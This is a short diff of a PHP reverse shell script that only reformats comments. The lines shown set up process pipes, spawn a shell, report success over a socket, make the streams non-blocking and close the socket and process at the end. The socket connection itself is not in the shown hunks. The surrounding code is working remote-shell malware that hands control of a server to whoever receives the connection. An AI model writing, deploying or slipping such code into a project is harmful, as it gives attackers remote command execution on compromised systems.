@@ -22,7 +22,7 @@
     fwrite($socket, "CONNECTION ESTABLISHED\n");
 
 
-    // process pipes
+    // file descriptors
     $descriptorspec = array 
     (
         0 => array( "pipe", "r" ),  #stdin
@@ -40,12 +40,12 @@
         exit("FAILED TO SPAWN SHELL\n");
     }
 
-    //notify host
+    // notify host
     fwrite($socket, "SHELL SPAWNED SUCCESSFULLY\n");
 
 
-    //set data streams to non-blocking so they
-    //don't wait for data when being read
+    // set data streams to non-blocking so they
+    // don't wait for data when being read
     stream_set_blocking($socket  , FALSE);
     stream_set_blocking($pipes[0], FALSE);
     stream_set_blocking($pipes[1], FALSE);
@@ -101,7 +101,7 @@
 
     }
 
-    //clean up nice
+    // clean up nice
     fclose($socket);
     proc_close($process);
 
